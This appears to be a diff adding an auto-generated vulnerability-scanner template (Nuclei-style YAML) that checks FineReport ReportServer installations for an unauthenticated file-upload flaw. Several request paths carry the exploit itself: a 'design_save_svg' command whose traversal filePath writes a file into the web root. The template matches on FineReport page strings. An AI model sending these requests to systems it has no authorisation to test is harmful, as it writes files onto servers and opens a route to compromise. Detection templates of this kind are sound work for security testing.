@@ -1,0 +1,33 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-v89-unauth_uploadfile
+info:
+  name: "v89 unauth_uploadfile"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, v89, ref-poc, uploadfile]
+  description: "由参考项目脚本静态导入：v89/unauth_uploadfile（类型 UPLOADFILE）。"
+http:
+  - method: GET
+    path:
+      - "/BI/ReportServer"
+      - "/WebReport/ReportServer"
+      - "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/qqq.svg.txt"
+      - "/bi/ReportServer"
+      - "/decision/login"
+      - "/fine-report/ReportServer"
+      - "/finereport/ReportServer"
+      - "/seeyonreport/ReportServer"
+      - "/seeyonreport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../seeyonreport/qqq.svg.txt"
+      - "/webroot/ReportServer"
+      - "/webroot/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../webroot/qqq.svg.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "/com/fr/scripts/ui/fineui.min.js"
+          - "FineReport--Web Reporting Tool"
+          - "1234567890"
